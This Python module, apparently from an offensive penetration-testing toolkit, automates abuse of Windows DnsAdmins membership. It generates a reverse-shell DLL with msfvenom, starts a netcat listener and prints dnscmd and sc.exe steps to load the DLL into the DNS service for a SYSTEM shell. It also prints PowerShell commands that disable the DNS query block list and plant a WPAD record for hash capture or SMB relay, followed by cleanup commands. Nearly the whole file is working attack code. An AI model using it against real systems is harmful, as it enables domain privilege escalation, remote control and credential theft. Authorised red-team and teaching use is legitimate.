import subprocess
from pathlib import Path

from modules.upload.windows import stage_windows_file
from core.attacker import resolve_lhost

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

PAYLOAD_DIR = (
    BASE_DIR /
    "payloads" /
    "windows" /
    "dnsadmins"
)

PAYLOAD_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

# =========================================================
# HELPERS
# =========================================================

def ask_member():

    try:

        result = input(
            f"\n{B}DnsAdmins member? [y/N]{W}> "
        ).strip().lower()

    except (KeyboardInterrupt, EOFError):

        print()

        return False

    return result == "y"


def start_listener(port):

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"nc -lvnp {port}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"Listener started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start listener:{W} {e}"
        )

        return False


# =========================================================
# MAIN MENU
# =========================================================

def render_main_menu():

    print(
        f"\n{B}[*]{W} "
        f"DNSADMINS ATTACK PATHS\n"
    )

    print(
        f"  {B}├──{W} [1] Reverse shell DLL"
    )

    print(
        f"  {B}├──{W} [2] WPAD poisoning"
    )

    print(
        f"  {B}└──{W} [3] Cleanup"
    )


# =========================================================
# REVSHELL DLL
# =========================================================

def revshell_flow(args):

    lhost = resolve_lhost(args)

    lport = 4444
    

    if not lhost or not lport:
        return

    output = PAYLOAD_DIR / "revshell.dll"

    cmd = [

        "msfvenom",

        "-p",
        "windows/x64/shell_reverse_tcp",

        f"LHOST={lhost}",
        f"LPORT={lport}",

        "-f",
        "dll",

        "-o",
        str(output),

    ]

    print(
        f"\n{B}[*]{W} "
        f"GENERATING DLL"
    )

    try:

        subprocess.run(
            cmd,
            check=True,
        )

    except Exception as e:

        print(
            f"\n{R}[!] "
            f"msfvenom failed:{W} {e}"
        )

        return

    print(
        f"\n{G}[+] DLL generated:{W}"
    )

    print(f"  {output}")

    # =====================================================
    # LISTENER
    # =====================================================

    start_listener(lport)

    # =====================================================
    # TRANSFER
    # =====================================================

    print(
        f"\n{B}[*]{W} "
        f"STARTING TRANSFER"
    )

    stage_windows_file(
        str(output)
    )

    # =====================================================
    # EXECUTION
    # =====================================================

    print(
        f"\n{B}[*]{W} "
        f"PRE-CHECKS\n"
    )

    print(
        f"  {B}├──{W} "
        f"Get-ADGroupMember -Identity DnsAdmins"
    )

    print(
        f"  {B}├──{W} "
        f"whoami /user"
    )

    print(
        f"  {B}└──{W} "
        f"sc.exe sdshow DNS"
    )

    print(
        f"\n{G}"
        f"┌── LOAD DLL "
        f"────────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"dnscmd.exe /config "
        f"/serverlevelplugindll "
        f"C:\\Users\\netadm\\revshell.dll"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── RESTART DNS "
        f"─────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"sc.exe stop dns"
    )

    print(
        f"{G}│{W} "
        f"sc.exe start dns"
    )

    print(
        f"{G}│{W} "
        f"sc.exe query dns"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{Y}"
        f"┌── EXPECTED RESULT "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"SYSTEM reverse shell callback"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# WPAD
# =========================================================

def wpad_flow():

    ip = input(
        f"\n{B}attacker IP{W}> "
    ).strip()

    domain = input(
        f"{B}domain{W}> "
    ).strip()

    if not ip or not domain:
        return

    print(
        f"\n{G}"
        f"┌── DISABLE BLOCKLIST "
        f"────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"Set-DnsServerGlobalQueryBlockList "
        f"-Enable $false "
        f"-ComputerName dc01.{domain}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── ADD WPAD RECORD "
        f"──────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"Add-DnsServerResourceRecordA "
        f"-Name wpad "
        f"-ZoneName {domain} "
        f"-ComputerName dc01.{domain} "
        f"-IPv4Address {ip}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{Y}"
        f"┌── NEXT STEPS "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"start Responder or Inveigh"
    )

    print(
        f"{Y}│{W} "
        f"capture hashes or relay SMB"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# CLEANUP
# =========================================================

def cleanup_flow():

    print(
        f"\n{G}"
        f"┌── VERIFY REGISTRY "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"reg query "
        f"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── REMOVE DLL "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"reg delete "
        f"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters "
        f"/v ServerLevelPluginDll"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── RESTART DNS "
        f"─────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"sc.exe start dns"
    )

    print(
        f"{G}│{W} "
        f"sc.exe query dns"
    )

    print(
        f"{G}│{W} "
        f"nslookup localhost"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] DNSADMINS ABUSE FRAMEWORK{W}"
    )

    if not ask_member():

        print(
            f"\n{R}[!] "
            f"DnsAdmins membership required.{W}"
        )

        return data

    render_main_menu()

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return data

    # =====================================================
    # REVSHELL
    # =====================================================

    if choice == "1":

        revshell_flow(args)

    # =====================================================
    # WPAD
    # =====================================================

    elif choice == "2":

        wpad_flow()

    # =====================================================
    # CLEANUP
    # =====================================================

    elif choice == "3":

        cleanup_flow()

    return data